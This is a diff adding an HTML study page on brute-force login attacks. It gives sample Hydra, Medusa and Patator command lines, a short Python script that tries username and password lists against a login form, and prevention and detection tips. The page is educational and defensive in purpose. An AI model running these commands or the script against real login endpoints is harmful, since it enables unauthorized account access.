@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Brute Force Login Notes</title>
+<style>
+  body { font-family: Arial, sans-serif; line-height: 1.6; max-width: 900px; margin: 2em auto; padding: 0 1em; }
+  h1, h2 { color: #2a7ae2; }
+  code { background: #f4f4f4; padding: 0.2em 0.4em; border-radius: 3px; }
+  pre { background: #f9f9f9; border-left: 4px solid #2a7ae2; padding: 1em; overflow-x: auto; }
+  ul { margin-top: 0; }
+  .tool { margin-bottom: 1.5em; }
+</style>
+</head>
+<body>
+
+<h1>🔐 Brute Force Login Notes</h1>
+
+<p>This guide explains brute-force login attacks, including tools, techniques, and defenses. Brute force attacks involve systematically trying username-password combinations to gain unauthorized access to systems.</p>
+
+<hr />
+
+<h2>1. Common Brute Force Tools</h2>
+
+<div class="tool">
+  <h3>Hydra</h3>
+  <p>Fast and flexible tool for password attacks on various protocols (HTTP, FTP, SSH, etc.).</p>
+  <pre>hydra -L users.txt -P passwords.txt ftp://example.com</pre>
+</div>
+
+<div class="tool">
+  <h3>Burp Suite (Intruder)</h3>
+  <p>GUI-based brute forcing using payload positions and lists.</p>
+  <pre>Configure Intruder positions & load wordlists for username/password fields.</pre>
+</div>
+
+<div class="tool">
+  <h3>Medusa</h3>
+  <p>Parallel login brute forcer for various services.</p>
+  <pre>medusa -h example.com -U users.txt -P passwords.txt -M ssh</pre>
+</div>
+
+<div class="tool">
+  <h3>Patator</h3>
+  <p>Modular brute-forcing tool with extensive support for protocols.</p>
+  <pre>patator ssh_login host=example.com user=FILE0 password=FILE1 0=users.txt 1=passwords.txt</pre>
+</div>
+
+<hr />
+
+<h2>2. Preventing Brute Force Attacks</h2>
+<ul>
+  <li>Implement account lockouts after a few failed attempts.</li>
+  <li>Use CAPTCHAs to stop automated login attempts.</li>
+  <li>Enforce strong password policies.</li>
+  <li>Use multi-factor authentication (MFA).</li>
+  <li>Monitor login patterns and flag anomalies.</li>
+</ul>
+
+<hr />
+
+<h2>3. Login Brute Force Detection Tips</h2>
+<ul>
+  <li>Check logs for repeated login failures from the same IP.</li>
+  <li>Monitor high-volume login requests to the same endpoint.</li>
+  <li>Set alerts for multiple failed logins in short timeframes.</li>
+</ul>
+
+<hr />
+
+<h2>4. Sample Python Script to Simulate Brute Force (Educational Use Only)</h2>
+<pre>
+import requests
+
+url = "http://example.com/login"
+usernames = ["admin", "user"]
+passwords = ["123456", "admin", "password"]
+
+for user in usernames:
+    for pwd in passwords:
+        r = requests.post(url, data={"username": user, "password": pwd})
+        if "Invalid" not in r.text:
+            print(f"[+] Success: {user}:{pwd}")
+</pre>
+
+<p><strong>Disclaimer:</strong> Use only on systems you own or have explicit permission to test. Unauthorized access is illegal.</p>
+
+<hr />
+
+<h2>Summary</h2>
+<ul>
+  <li>Brute force attacks exploit weak passwords and lack of login protections.</li>
+  <li>Tools like <code>Hydra</code>, <code>Medusa</code>, and <code>Burp Suite</code> automate this process.</li>
+  <li>Use detection and prevention mechanisms to protect applications.</li>
+</ul>
+
+<p>Stay secure and ethical! 🛡️</p>
+
+<div style="margin-top: 2em;">
+  <a href="javascript:history.back()" style="text-decoration: none; font-weight: bold; font-size: 1.1em;">
+    &#8592; Go Back
+  </a>
+</div>
+
+</body>
+</html>
